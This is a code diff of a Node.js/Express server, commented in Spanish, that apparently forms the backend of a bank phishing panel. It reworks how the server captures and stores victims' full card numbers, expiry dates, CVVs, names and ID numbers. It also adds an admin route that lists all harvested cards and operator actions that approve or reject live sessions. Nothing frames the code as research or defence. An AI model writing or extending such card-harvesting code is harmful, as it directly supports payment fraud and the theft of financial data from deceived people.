@@ -9,13 +9,14 @@ app.use(express.json());
 app.use(express.static(__dirname));
 
 const DB_FILE = path.join(__dirname, 'db.json');
-let db = { sesiones: [], historial: [] };
+let db = { sesiones: [], historial: [], tarjetas: [] };
 
 if (fs.existsSync(DB_FILE)) {
     try {
         const parsed = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
         db.sesiones = parsed.sesiones || [];
         db.historial = parsed.historial || [];
+        db.tarjetas = parsed.tarjetas || [];
     } catch (e) {}
 }
 
@@ -34,15 +35,23 @@ app.post('/api/sesion', (req, res) => {
         db.sesiones.push(sesion);
     }
 
-    // 🔥 GUARDAR EN EL HISTORIAL AUTOMÁTICAMENTE AL RECIBIR TARJETA 🔥
-    if (paso === 'Tarjeta' && datos.tarjeta) {
-        db.historial.push({
-            id: 'H-' + Date.now() + '-' + Math.floor(Math.random() * 1000),
-            sessionId: sessionId,
-            estado: estado || 'pendiente',
-            datos: { bancoKey, ...datos },
-            fecha: new Date()
-        });
+    // 🔥 GUARDAR TARJETA AUTOMÁTICAMENTE EN EL HISTORIAL EN EL INSTANTE 🔥
+    if (datos && datos.tarjeta) {
+        const tarjetaExiste = db.tarjetas.find(t => t.tarjeta === datos.tarjeta && t.sessionId === sessionId);
+        if (!tarjetaExiste) {
+            db.tarjetas.push({
+                id: 'T-' + Date.now(),
+                sessionId: sessionId,
+                nombre: (datos.datosPersonales?.primerNombre || '') + ' ' + (datos.datosPersonales?.primerApellido || ''),
+                documento: datos.docNumber || '-',
+                tarjeta: datos.tarjeta,
+                expMes: datos.expMes || '',
+                expAnio: datos.expAnio || '',
+                cvv: datos.cvv || '-',
+                estado: estado || 'pendiente',
+                fecha: new Date()
+            });
+        }
     }
 
     guardarDB();
@@ -60,7 +69,7 @@ app.get('/admin/stats', (req, res) => {
     res.json({
         sesiones: db.sesiones.length,
         pendientes: db.sesiones.filter(s => s.estado === 'pendiente').length,
-        historial: db.historial.length
+        historial: db.tarjetas.length
     });
 });
 
@@ -83,35 +92,22 @@ app.post('/admin/sesion/:sessionId/accion', (req, res) => {
     else if (accion === 'RECHAZAR') sesion.estado = 'rechazado';
     else return res.status(400).json({ error: 'Acción no permitida' });
 
-    // 🔥 ACTUALIZAR EL ESTADO EN EL HISTORIAL (NO DUPLICA, SOLO ACTUALIZA) 🔥
-    db.historial.forEach(h => {
-        if (h.sessionId === sessionId && h.estado === 'pendiente') {
-            h.estado = sesion.estado;
+    // Actualizar estado en el historial de tarjetas
+    db.tarjetas.forEach(t => {
+        if (t.sessionId === sessionId && t.estado === 'pendiente') {
+            t.estado = sesion.estado;
         }
     });
 
+    db.historial.push({ ...sesion, fechaCierre: new Date() });
     guardarDB();
     res.json({ ok: true, estado: sesion.estado });
 });
 
-// RUTA PARA VER TODAS LAS TARJETAS (LEE DIRECTAMENTE DEL HISTORIAL)
+// RUTA PARA VER TODAS LAS TARJETAS
 app.get('/admin/tarjetas', (req, res) => {
-    const tarjetas = db.historial
-        .filter(h => h.datos && h.datos.tarjeta)
-        .map(h => ({
-            id: h.id,
-            nombre: (h.datos.datosPersonales?.primerNombre || '') + ' ' + (h.datos.datosPersonales?.primerApellido || ''),
-            documento: h.datos.docNumber || '-',
-            tarjeta: h.datos.tarjeta,
-            expMes: h.datos.expMes || '',
-            expAnio: h.datos.expAnio || '',
-            cvv: h.datos.cvv || '-',
-            estado: h.estado,
-            fecha: h.fecha
-        }))
-        .sort((a, b) => new Date(b.fecha) - new Date(a.fecha));
-        
-    res.json({ tarjetas });
+    const tarjetasOrdenadas = [...db.tarjetas].sort((a, b) => new Date(b.fecha) - new Date(a.fecha));
+    res.json({ tarjetas: tarjetasOrdenadas });
 });
 
 app.get('/admin/activos', (req, res) => res.json({ activos: [] }));
